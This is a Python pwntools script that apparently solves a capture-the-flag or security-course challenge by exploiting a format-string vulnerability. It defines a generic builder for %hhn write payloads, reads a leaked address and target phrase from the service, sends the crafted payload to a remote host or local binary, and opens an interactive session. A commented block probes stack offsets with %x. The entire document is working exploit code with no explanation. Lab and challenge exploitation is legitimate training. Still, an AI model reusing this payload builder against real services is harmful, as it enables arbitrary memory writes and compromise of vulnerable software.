#!/usr/bin/env python3

from pwn import *
import struct

HOST = "6447.lol"
PORT = 28682

context.arch = "amd64"
# context.log_level = 'error'

# elf = context.binary = ELF(f"{__file__.replace('_sol.py', '')}")
# libc = elf.libc

def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    if max_size % 8 != 0:
        raise Exception('Max size must be a multiple of 8.')

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload
    
def connect_binary():
    global P
    if args.REMOTE:
        P = remote(HOST, PORT)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

def exploit():
    connect_binary()
    P.recvuntil(b'at ')
    address = int(P.recvline().strip(), 16)
    log.info(f"address: {p64(address)}")

    P.recvuntil(b'Speak the phrase `')
    phrase = P.recvuntil(b'`')[:-1]
    log.info(f"Target value: {phrase}")

    P.recvuntil(b':')

    # payload = fmtstr_payload(8, {address : phrase})
    payload = build_format_string(address, u64(phrase.ljust(8, b'\x00')), 8)
    P.sendline(payload)

    log.info(f"payload: {payload}")
    P.interactive()

if __name__ == '__main__':
    exploit()

    # for i in range(20):
    #     try:
    #         connect_binary()

    #         P.sendline('AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
    #         P.recvuntil('AAAABBBB ')
    #         print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode()))

    #         P.close()
    #     except:
    #         print('{}: Random Address'.format(i))
    #         pass 